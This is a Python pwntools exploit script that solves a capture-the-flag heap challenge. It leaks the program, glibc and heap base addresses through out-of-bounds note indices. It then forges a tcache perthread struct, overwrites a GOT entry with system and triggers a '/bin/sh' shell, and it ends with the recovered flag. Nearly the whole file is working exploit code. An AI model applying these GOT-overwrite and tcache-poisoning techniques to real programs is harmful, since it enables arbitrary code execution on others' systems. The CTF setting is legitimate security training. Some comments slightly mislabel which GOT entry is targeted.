from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    continue
''')

# p = remote('iloverust.challs.pwnoh.io', 1337, ssl=True)

# note structure is 0x10-byte-long, including an 8-byte pointer pointing to its content, a 4-byte integer indicating its size, and another 4-byte integer indicating its id
'''
struct note {
    char *content;
    int size;
    int id;
};
'''
# note structures (0x10 at most) are stored in global variable "notes" (first unused slot) at offset 0x4080 within .bss section

# create note of size with content
def create_note(size, content):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"Note size? > ", str(size).encode())
    p.sendlineafter(b"Enter your note: ", content)
    p.recvuntil(b"Note ID is ")
    return int(p.recvuntil(b".", drop=True), 10)

# read content of note at index, no index checking, available for integer overflow to leak
def read_note(index):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"Note ID? > ", str(index).encode())
    p.recvuntil(b"Note: ")
    return p.recvline().strip()

# modify note at index to size with content
def modify_note(index, size, content):
    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"Note ID? > ", str(index).encode())
    p.sendlineafter(b"New size? > ", str(size).encode())
    p.sendlineafter(b"Enter your note: \n", content)

# delete note at index
def delete_note(index):
    p.sendlineafter(b"> ", b'4')
    p.sendlineafter(b"Note ID? > ", str(index).encode())

e = ELF('./chall')
glibc_e = ELF('./libc.so.6')

# 1. leak elf base address, glibc base address, and heap base address through integer overflow
elf_base_addr = u64(read_note(-2).ljust(8, b'\x00'))-e.symbols['__dso_handle']
log.info(f"elf base address: {hex(elf_base_addr)}")
glibc_base_addr = u64(read_note(-12).ljust(8, b'\x00'))-glibc_e.symbols['_IO_2_1_stderr_']
log.info(f"glibc base address: {hex(glibc_base_addr)}")
heap_base_addr = u64(read_note(((glibc_base_addr+glibc_e.symbols['main_arena']+0x70)-(elf_base_addr+e.symbols['notes']))//0x10).ljust(8, b'\x00'))-0x136c0 # 0x142c0 remotely
log.info(f"heap base address: {hex(heap_base_addr)}")

# 2. exploit tcache perthread struct to overwrite free@got with glibc system address
# fake note structure at heap_base_addr+0x136d0 whose content points to tcache perthread struct at heap_base_addr+0x10, ensure fake id passes assert check
create_note(0x18, p64(heap_base_addr+0x10)+p32(0x290)+p32(((heap_base_addr+0x136d0)-(elf_base_addr+e.symbols['notes']))//0x10)) # 0x142d0 remotely
# free tcache perthread struct at heap_base_addr+0x10
delete_note(((heap_base_addr+0x136d0)-(elf_base_addr+e.symbols['notes']))//0x10) # 0x142d0 remotely
# fake tcache perthread struct
class TcachePerthreadStruct:
    def __init__(self):
        self.counts = [0]*64
        self.pointers = [0]*64
    def set_count(self, size, count):
        idx = (size-0x20) // 16
        self.counts[idx] = count
    def set_pointer(self, size, pointer):
        idx = (size-0x20) // 16
        self.pointers[idx] = pointer
    def set(self, size, pointer, count=1):
        self.set_pointer(size, pointer)
        self.set_count(size, count)
    def __bytes__(self):
        res = b''
        for count in self.counts:
            res += p16(count)
        for pointer in self.pointers:
            res += p64(pointer)
        return res
fake_tcache = TcachePerthreadStruct()
fake_tcache.set(0x20, elf_base_addr+e.got.fflush)
# overwrite tcache perthread struct at heap_base_addr+0x10 with fake one
create_note(0x288, bytes(fake_tcache)[:-1])
# overwrite free@got with glibc system address
create_note(0x18, p64(glibc_base_addr+glibc_e.symbols.fflush)+p64(glibc_base_addr+glibc_e.symbols.system))
# put string "/bin/sh\x00" into heap_base_addr+0x136d0
modify_note(0, 0x18, b'/bin/sh\x00')
# call free(heap_base_addr+0x136d0) to trigger system("/bin/sh\x00")
delete_note(0)

p.interactive()

# bctf{NULL_p01nter_expl01tat10n_also_btw_i_also_love_rust}